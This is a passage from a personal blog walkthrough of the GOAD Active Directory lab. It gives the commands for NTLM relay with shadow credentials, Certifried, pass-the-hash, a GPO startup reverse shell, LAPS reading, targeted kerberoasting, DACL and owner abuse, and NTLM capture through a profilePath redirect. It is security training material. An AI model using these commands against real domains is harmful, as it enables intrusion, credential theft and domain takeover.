<div class="highlight"><pre><span></span><code>impacket-ntlmrelayx<span class="w"> </span>-t<span class="w"> </span>ldaps://meereen.essos.local<span class="w"> </span>--shadow-credentials<span class="w"> </span>--shadow-target<span class="w"> </span><span class="s1">'BRAAVOS$'</span><span class="w"> </span>--remove-mic<span class="w"> </span>-smb2support<span class="w"> </span>--no-validate-privs
</code></pre></div>
<p><img alt="essos-shadow-credential-relay.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-shadow-credential-relay.png"/></p>
<p>Note that, since DC is a Windows Server 2016, it's vulnerable to <strong>CVE-2019-1019</strong> (drop-the-mic); this allows to relay credentials from SMB to LDAP.</p>
<p>Decrypt the output pfx in order to use it with <code>certipy-ad</code> to authenticate to the DC:</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>cert<span class="w"> </span>-pfx<span class="w"> </span>i5XJWpcU.pfx<span class="w"> </span>-password<span class="w"> </span><span class="s2">"r4gPME65qEZuiiLomZya"</span><span class="w"> </span>-export<span class="w"> </span>-out<span class="w"> </span><span class="s1">'BRAAVOS$.pfx'</span>
certipy-ad<span class="w"> </span>auth<span class="w"> </span>-pfx<span class="w"> </span>BRAAVOS<span class="se">\$</span>.pfx<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.1.0.12<span class="w"> </span>-u<span class="w"> </span><span class="s1">'BRAAVOS$'</span><span class="w"> </span>-domain<span class="w"> </span>essos.local
</code></pre></div>
<p><img alt="essos-shadow-credential-relay-auth.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-shadow-credential-relay-auth.png"/></p>
<h3 id="certifried_1">Certifried</h3>
<p>Being the AD CS server a Windows 2019, it could be vulnerable to CVE-2022&ndash;26923.</p>
<p>Add a machine account with a spoofed <code>dNSHostName</code> with <code>certipy-ad</code>:</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>account<span class="w"> </span>create<span class="w"> </span>-u<span class="w"> </span>khal.drogo@essos.local<span class="w"> </span>-p<span class="w"> </span>horse<span class="w"> </span>-user<span class="w"> </span><span class="s1">'certifried$'</span><span class="w"> </span>-dns<span class="w"> </span><span class="s1">'meereen.essos.local'</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.1.0.12
</code></pre></div>
<p><img alt="essos-certifried-create-account.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-certifried-create-account.png"/></p>
<p>Request a certificate for the created machine account:</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>req<span class="w"> </span>-u<span class="w"> </span><span class="s1">'certifried$'</span>@essos.local<span class="w"> </span>-p<span class="w"> </span><span class="s1">'lityYSptCNMMfzGn'</span><span class="w"> </span>-ca<span class="w"> </span>ESSOS-CA<span class="w"> </span>-template<span class="w"> </span>Machine<span class="w"> </span>-target<span class="w"> </span>braavos.essos.local<span class="w"> </span>-debug
</code></pre></div>
<p><img alt="essos-certifried-req-certificate.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-certifried-req-certificate.png"/></p>
<p>Authenticate with the certificate:</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>auth<span class="w"> </span>-pfx<span class="w"> </span>meereen.pfx<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.1.0.12
</code></pre></div>
<p><img alt="essos-certifried-create-account.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-certifried-create-account.png"/></p>
<p>Pass the hash with Impacket's <code>secretsdump</code>:</p>
<div class="highlight"><pre><span></span><code>impacket-secretsdump<span class="w"> </span>-hashes<span class="w"> </span>aad3b435b51404eeaad3b435b51404ee:2ed16485d41a887f04791d626e77efef<span class="w"> </span><span class="s1">'ESSOS.local/MEEREEN$'</span>@meereen.essos.local
</code></pre></div>
<p><img alt="essos-certifried-pth.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-certifried-pth.png"/></p>
<h2 id="acl-abuses_1">ACL Abuses</h2>
<h3 id="gpo-abuse">GPO Abuse</h3>
<div class="highlight"><pre><span></span><code>Get-GPO -All
</code></pre></div>
<p><img alt="north-gpo-enumeration.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-gpo-enumeration.png"/></p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-GPPermission</span> <span class="n">-Name</span> <span class="s2">"StarkWallpaper"</span> <span class="n">-All</span>
</code></pre></div>
<p><img alt="north-gpo-permissions-enumeration.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-gpo-permissions-enumeration.png"/></p>
<p><code>samwell.tarly</code> has read and write permission on the <code>StarkWallpaper</code> GPO.</p>
<p><code>samwell.tarly</code> cannot RDP to 10.1.0.11; having its password, it's possible to inject its network credentials using <code>runas</code> and open the <strong>Microsoft Management Console</strong> (<code>mmc.exe</code>) from another user session in order to edit the GPO:</p>
<div class="highlight"><pre><span></span><code>runas.exe<span class="w"> </span>/netonly<span class="w"> </span>/user:NORTH<span class="se">\s</span>amwell.tarly<span class="w"> </span>mmc.exe
</code></pre></div>
<p><img alt="north-gpo-startup-script.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-gpo-startup-script.png"/></p>
<p>The script <code>reverse.ps1</code> will open a reverse shell each time a user logs in.</p>
<p>Note that this GPO applies to all authenticated users:</p>
<p><img alt="north-gpo-security-filtering.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-gpo-security-filtering.png"/></p>
<p>Force GPO applying:</p>
<div class="highlight"><pre><span></span><code>gpupdate<span class="w"> </span>/force
</code></pre></div>
<h3 id="laps-password">LAPS Password</h3>
<p>While doing some enumeration, the group SPY is found to have <code>ReadLAPSPassword</code> privileges, allowing members to read LAPS password for BRAAVOS.</p>
<p><img alt="braavos-bloodhoud-spy-readlapspassword.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/braavos-bloodhoud-spy-readlapspassword.png"/></p>
<p>Get LAPS password :</p>
<div class="highlight"><pre><span></span><code><span class="c1"># With pyLAPS</span>
python3<span class="w"> </span>./pyLAPS.py<span class="w"> </span>--action<span class="w"> </span>get<span class="w"> </span>-d<span class="w"> </span><span class="s2">"SEVENKINGDOMS.local"</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">"cersei.lannister"</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">"il0vejaime"</span><span class="w"> </span>--dc-ip<span class="w"> </span><span class="m">10</span>.1.0.12

<span class="c1"># With NetExec</span>
nxc<span class="w"> </span>ldap<span class="w"> </span><span class="m">10</span>.1.0.12<span class="w"> &nbsp;</span>-u<span class="w"> </span><span class="s1">'SEVENKINGDOMS.local\cersei.lannister'</span><span class="w"> </span>-p<span class="w"> </span>il0vejaime<span class="w"> </span>--module<span class="w"> </span>laps
</code></pre></div>
<p><img alt="braavos-get-laps-password-1.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/braavos-get-laps-password-1.png"/></p>
<h3 id="targeted-kerberoast">Targeted Kerberoast</h3>
<p>Enumerating <code>missandei</code> rights with <code>BloodHound</code>, it's noticed that this account has <code>GenericAll</code> permissions on <code>khal.drogo</code>; this allows to perform a targeted kerberoast attack against this user.</p>
<p><img alt="essos-targetedkerberoast-enum.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-targetedkerberoast-enum.png"/></p>
<div class="highlight"><pre><span></span><code>targetedKerberoast.py<span class="w"> </span>-v<span class="w"> </span>-d<span class="w"> </span><span class="s1">'essos.local'</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">'missandei'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'fr3edom'</span>
</code></pre></div>
<p><img alt="essos-targetedkerberoast.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-targetedkerberoast.png"/></p>
<p>Cracking <code>khal.drogo</code> TGS:</p>
<div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>khaldogo.targetedkerberoasting<span class="w"> </span>/usr/share/wordlists/rockyou.txt
</code></pre></div>
<p><img alt="essos-targetedkerberoast-crack.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-targetedkerberoast-crack.png"/></p>
<p>Password for <code>khal.drogo</code> is <code>horse</code>.</p>
<h3 id="force-change-password">Force Change Password</h3>
<p>Since <code>khal.drogo</code> has <code>GenericAll</code> rights on <code>viserys.targaryen</code>, it can also force a password change for this account:</p>
<p><img alt="essos-shadow-credential-enum.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-shadow-credential-enum.png"/></p>
<p>Set a new password for <code>viserys.targaryen</code> with <code>net</code>; new password will be <code>password</code>:</p>
<div class="highlight"><pre><span></span><code>net<span class="w"> </span>rpc<span class="w"> </span>password<span class="w"> </span><span class="s2">"viserys.targaryen"</span><span class="w"> </span>-U<span class="w"> </span><span class="s2">"essos.local"</span>/<span class="s2">"khal.drogo"</span><span class="w"> </span>-S<span class="w"> </span><span class="s2">"meereen.essos.local"</span>
</code></pre></div>
<p><img alt="acl-force-change-password-change-password.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/acl-force-change-password-change-password.png"/></p>
<p>Check new credentials are valid with <code>NetExec</code>:</p>
<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span>meereen.essos.local<span class="w"> </span>-u<span class="w"> </span><span class="s1">'viserys.targaryen'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'password'</span>
</code></pre></div>
<p><img alt="acl-force-change-password-check-password.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/acl-force-change-password-check-password.png"/></p>
<h3 id="acl-chain-1">ACL Chain 1</h3>
<p><img alt="acl-chain-1-path.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/acl-chain-1-path.png"/></p>
<p><code>tywin.lannister</code> -&gt; <code>ForceChangePassword</code> -&gt; <code>jaime.lannister</code></p>
<p>Force change password with <code>net</code>:</p>
<div class="highlight"><pre><span></span><code>net<span class="w"> </span>rpc<span class="w"> </span>password<span class="w"> </span><span class="s2">"jaime.lannister"</span><span class="w"> </span>-U<span class="w"> </span><span class="s2">"sevenkingdoms.local"</span>/<span class="s2">"tywin.lannister"</span><span class="w"> </span>-S<span class="w"> </span><span class="s2">"kingslanding.sevenkingdoms.local"</span>
</code></pre></div>
<p><img alt="acl-chain-1-change-password.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/acl-chain-1-change-password.png"/></p>
<p><code>jaime.lannister</code> -&gt; <code>GenericWrite</code> -&gt; <code>joffrey.baratheon</code></p>
<p>Perform a targeted kerberoasting attack with <code>targetedKerberoast.py</code>:</p>
<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>targetedKerberoast.py<span class="w"> </span>-v<span class="w"> </span>-d<span class="w"> </span><span class="s1">'sevenkingdoms.local'</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">'jaime.lannister'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'password123'</span>
</code></pre></div>
<p><img alt="acl-chain-1-targeted-kerberoasting.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/acl-chain-1-targeted-kerberoasting.png"/></p>
<p>Crack the recovered hash with <code>hashcat</code>:</p>
<div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>jeoffrey.baratheon.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>
</code></pre></div>
<p><img alt="acl-chain-1-ticket-cracking.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/acl-chain-1-ticket-cracking.png"/></p>
<p><code>jeoffrey.baratheon</code> -&gt; <code>WriteDacl</code> -&gt; <code>tyron.lannister</code></p>
<p>Edit DACL on <code>tyron.lannister</code> adding <code>FullControl</code> for  <code>jeoffrey.baratheon</code> with Impacket's <code>dacledit</code>:</p>
<div class="highlight"><pre><span></span><code>impacket-dacledit<span class="w"> </span>-action<span class="w"> </span><span class="s1">'write'</span><span class="w"> </span>-rights<span class="w"> </span><span class="s1">'FullControl'</span><span class="w"> </span>-principal<span class="w"> </span><span class="s1">'joffrey.baratheon'</span><span class="w"> </span>-target<span class="w"> </span><span class="s1">'tyron.lannister'</span><span class="w"> </span><span class="s1">'sevenkingdoms.local'</span>/<span class="s1">'joffrey.baratheon'</span>:<span class="s1">'1killerlion'</span>
</code></pre></div>
<p><img alt="acl-chain-1-dacl-edit.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/acl-chain-1-dacl-edit.png"/></p>
<p>Perform a shadow credentials attack with <code>certipy-ad</code> abusing granted <code>FullControl</code> privileges:</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>shadow<span class="w"> </span>auto<span class="w"> </span>-username<span class="w"> </span>joffrey.baratheon@sevenkingdoms.local<span class="w"> </span>-p<span class="w"> </span>1killerlion<span class="w"> </span>-account<span class="w"> </span>tyron.lannister
</code></pre></div>
<p><img alt="acl-chain-1-shadow-credentials.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/acl-chain-1-shadow-credentials.png"/></p>
<p>Pass-the-ticket to check authentication against the DC:</p>
<div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>tyron.lannister.ccache<span class="w"> </span>
nxc<span class="w"> </span>smb<span class="w"> </span>kingslanding.sevenkingdoms.local<span class="w"> </span>-u<span class="w"> </span>tyron.lannister<span class="w"> </span>-k<span class="w"> </span>--use-kcache
</code></pre></div>
<p><img alt="acl-chain-1-shadow-credentials-check.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/acl-chain-1-shadow-credentials-check.png"/></p>
<p>Restore DACL with Impacket's <code>dacledit</code>:</p>
<div class="highlight"><pre><span></span><code>impacket-dacledit<span class="w"> </span>-action<span class="w"> </span><span class="s1">'restore'</span><span class="w"> </span>-file<span class="w"> </span>dacledit-20250317-082720.bak<span class="w"> </span>-target<span class="w"> </span><span class="s1">'tyron.lannister'</span><span class="w"> </span><span class="s1">'sevenkingdoms.local'</span>/<span class="s1">'joffrey.baratheon'</span>:<span class="s1">'1killerlion'</span>
</code></pre></div>
<p><img alt="acl-chain-1-dacl-restore.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/acl-chain-1-dacl-restore.png"/></p>
<h3 id="acl-chain-2">ACL Chain 2</h3>
<p><img alt="acl-chain-2-path.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/acl-chain-2-path.png"/></p>
<p><code>tyron.lannister</code> -&gt; <code>AddSelf</code> -&gt; <code>Small Council</code></p>
<p>Abuse <code>AddSelf</code> right by adding <code>tyron.lannister</code> to <code>Small Council</code> with <code>bloodyAD</code>:</p>
<div class="highlight"><pre><span></span><code>bloodyAD<span class="w"> </span>--host<span class="w"> </span><span class="s2">"10.1.0.10"</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">"sevenkingdoms.local"</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">"tyron.lannister"</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">"aad3b435b51404eeaad3b435b51404ee:b3b3717f7d51b37fb325f7e7d048e998"</span><span class="w"> </span>add<span class="w"> </span>groupMember<span class="w"> </span><span class="s2">"Small Council"</span><span class="w"> </span><span class="s2">"tyron.lannister"</span>
</code></pre></div>
<p><img alt="acl-chain-2-addself-smallcouncil.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/acl-chain-2-addself-smallcouncil.png"/></p>
<p><code>SmallCouncil</code> -&gt; <code>AddMember</code> -&gt; <code>DragonStone</code></p>
<p>Since <code>Small Council</code> can <code>AddMember</code> on <code>DragonStone</code>, <code>tyron.lannister</code> can now add himself to the latter using <code>bloodyAD</code>:</p>
<div class="highlight"><pre><span></span><code>bloodyAD<span class="w"> </span>--host<span class="w"> </span><span class="s2">"10.1.0.10"</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">"sevenkingdoms.local"</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">"tyron.lannister"</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">"aad3b435b51404eeaad3b435b51404ee:b3b3717f7d51b37fb325f7e7d048e998"</span><span class="w"> </span>add<span class="w"> </span>groupMember<span class="w"> </span><span class="s2">"DragonStone"</span><span class="w"> </span><span class="s2">"tyron.lannister"</span>
</code></pre></div>
<p><img alt="acl-chain-2-addmember-dragonstone.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/acl-chain-2-addmember-dragonstone.png"/></p>
<p><code>DragonStone</code> -&gt; <code>WriteOwner</code> -&gt; <code>KingsGuard</code></p>
<p>Since <code>DragonStone</code> can <code>WriteOwner</code> on <code>KingsGuard</code>, <code>tyron.lannister</code> can now set himself as the owner to the latter using Impacket's <code>owneredit</code>:</p>
<div class="highlight"><pre><span></span><code>impacket-owneredit<span class="w"> </span>-action<span class="w"> </span>write<span class="w"> </span>-new-owner<span class="w"> </span><span class="s1">'tyron.lannister'</span><span class="w"> </span>-target<span class="w"> </span><span class="s1">'KingsGuard'</span><span class="w"> </span>-hashes<span class="w"> </span>aad3b435b51404eeaad3b435b51404ee:b3b3717f7d51b37fb325f7e7d048e998<span class="w"> </span><span class="s1">'sevenkingdoms.local'</span>/<span class="s1">'tyron.lannister'</span>
</code></pre></div>
<p><img alt="acl-chain-2-check-owner.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/acl-chain-2-check-owner.png"/></p>
<p>Confirm current owner is <code>tyron.lannister</code>:</p>
<div class="highlight"><pre><span></span><code>impacket-owneredit<span class="w"> </span>-action<span class="w"> </span><span class="nb">read</span><span class="w"> </span>-target<span class="w"> </span><span class="s1">'KingsGuard'</span><span class="w"> </span>-hashes<span class="w"> </span>aad3b435b51404eeaad3b435b51404ee:b3b3717f7d51b37fb325f7e7d048e998<span class="w"> </span><span class="s1">'sevenkingdoms.local'</span>/<span class="s1">'tyron.lannister'</span>
</code></pre></div>
<p><img alt="acl-chain-2-change-owner.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/acl-chain-2-change-owner.png"/></p>
<p>Now that <code>tyron.lannister</code> owns <code>KingsGuard</code>, can grant himself <code>WriteMembers</code> rights:</p>
<div class="highlight"><pre><span></span><code>impacket-dacledit<span class="w"> </span>-action<span class="w"> </span><span class="s1">'write'</span><span class="w"> </span>-rights<span class="w"> </span><span class="s1">'WriteMembers'</span><span class="w"> </span>-principal<span class="w"> </span><span class="s1">'tyron.lannister'</span><span class="w"> </span>-target<span class="w"> </span><span class="s1">'KingsGuard'</span><span class="w"> </span>-hashes<span class="w"> </span>aad3b435b51404eeaad3b435b51404ee:b3b3717f7d51b37fb325f7e7d048e998<span class="w"> </span><span class="s1">'sevenkingdoms.local'</span>/<span class="s1">'tyron.lannister'</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
</code></pre></div>
<p><img alt="acl-chain-2-add-writemembers-kingsguard.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/acl-chain-2-add-writemembers-kingsguard.png"/></p>
<p>And then, he can add himself to <code>KingsGuard</code> with <code>bloodAD</code>:</p>
<div class="highlight"><pre><span></span><code>bloodyAD<span class="w"> </span>--host<span class="w"> </span><span class="s2">"10.1.0.10"</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">"sevenkingdoms.local"</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">"tyron.lannister"</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">"aad3b435b51404eeaad3b435b51404ee:b3b3717f7d51b37fb325f7e7d048e998"</span><span class="w"> </span>add<span class="w"> </span>groupMember<span class="w"> </span><span class="s2">"KingsGuard"</span><span class="w"> </span><span class="s2">"tyron.lannister"</span>
</code></pre></div>
<p><img alt="acl-chain-2-add-member-kingsguard.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/acl-chain-2-add-member-kingsguard.png"/></p>
<p>Being part of <code>KingsGuard</code>, <code>tyron.lannister</code> can perform a shadow credentials attack on <code>stannis.baratheon</code>:</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>shadow<span class="w"> </span>auto<span class="w"> </span>-username<span class="w"> </span>tyron.lannister@sevenkingdoms.local<span class="w"> </span>-hashes<span class="w"> </span>aad3b435b51404eeaad3b435b51404ee:b3b3717f7d51b37fb325f7e7d048e998<span class="w"> </span>-account<span class="w"> </span>stannis.baratheon
</code></pre></div>
<p><img alt="acl-chain-2-shadow-credentials-stannisbaratheon.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/acl-chain-2-shadow-credentials-stannisbaratheon.png"/></p>
<p><code>stannis.baratheon</code> -&gt; <code>GenericAll</code> -&gt; <code>kingslanding.sevenkingdoms.local</code></p>
<p>Since <code>stannis.baratheon</code> has <code>GenericAll</code> rights on <code>kingslanding.sevenkingdoms.local</code>, it's possible to perform resource-based constrained delegation to impersonate a domain admin and pwn the DC:</p>
<p><img alt="acl-chain-2-stannisbaratheon-genericall-kingslanding.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/acl-chain-2-stannisbaratheon-genericall-kingslanding.png"/></p>
<h3 id="genericwrite-profilepath">GenericWrite - profilePath</h3>
<p>Since <code>jaime.lannister</code> has <code>GenericWrite</code> permissions on <code>joffrey.baratheon</code>, she can edit any attribute, such has <code>profilePath</code> that will be set to a user controlled SMB server:</p>
<div class="highlight"><pre><span></span><code>bloodyAD<span class="w"> </span>--host<span class="w"> </span><span class="s2">"10.1.0.10"</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">"sevenkingdoms.local"</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">"jaime.lannister"</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">"password123"</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span>object<span class="w"> </span><span class="s1">'joffrey.baratheon'</span><span class="w"> </span>profilePath<span class="w"> </span>-v<span class="w"> </span><span class="s1">'//10.1.0.4/share'</span>
</code></pre></div>
<p>Simulate a RDP connection with <code>joffrey.baratheon</code> in order to intercept the NTLM hashes with <code>responder</code>:</p>
<p><img alt="acl-generic-write-profilePath.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/acl-generic-write-profilePath.png"/></p>
  </div>
  <div class="tag-cloud">
    <p>
    </p>
  </div>






</article>

<footer>
<p>&copy; Jack69 - 2025 </p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script id="dark-theme-script"
          src="https://ojack69.github.io/jacks-corner/theme/dark-theme/dark-theme.min.js"
          data-enable-auto-detect-theme="True"
          data-default-theme="dark"
          type="text/javascript">
  </script>
</p></footer>  </main>

<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " Jack's Corner ",
  "url" : "https://ojack69.github.io/jacks-corner",
  "image": "",
  "description": "My personal notes on stuff I like, nothing special"
}
</script>  <script>
    window.loadStorkIndex = function () {
      stork.initialize("https://ojack69.github.io/jacks-corner/theme/stork/stork.wasm")
      stork.register("sitesearch", "https://ojack69.github.io/jacks-corner/search-index.st", { showProgress: false });
    }
  </script>
  <script src="https://ojack69.github.io/jacks-corner/theme/stork/stork.js"></script>

</body>
</html>